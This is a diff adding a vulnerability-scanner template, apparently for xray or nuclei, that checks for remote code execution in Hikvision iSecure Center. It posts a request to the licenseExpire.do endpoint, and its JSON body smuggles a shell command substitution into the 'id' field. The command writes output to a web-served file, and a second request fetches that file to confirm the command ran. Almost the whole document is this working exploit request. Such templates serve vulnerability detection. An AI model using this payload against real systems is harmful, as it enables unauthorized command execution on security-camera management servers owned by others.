@@ -1,0 +1,27 @@
+name: hikvision-iSecure-Cente-licenseExpire-Rce
+set:
+    randstr: randomLowercase(10)
+rules:
+  - method: POST
+    path: "/portal/cas/login/ajax/licenseExpire.do"
+    headers:
+      Accept: application/json, text/javascript, */*; q=0.01
+      X-Requested-With: XMLHttpRequest
+      If-Modified-Since: Thu, 01 Jun 1970 00:00:00 GMT
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+      Content-Type: application/x-www-form-urlencoded
+      Referer: http:///portal/cas/login/loginPage.do?service=http://x.x.x.x:80/portal
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+      Cookie: JSESSIONID=jp9u6tFmSc3fk7Jzf9DQjK25abfBb_b4Yy1r4rax; curtTabId=all; configMenu=
+    body: 
+      '{"type":"environment","operate":"","machines":{"id":"$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/{{randstr}}.txt)"}'
+    expression: |
+      response.status == 200
+  - method: GET
+    path: "/vms/static/{{randstr}}.txt"
+    expression: |
+      response.status == 200
+    
+detail:
+  author: fliggy
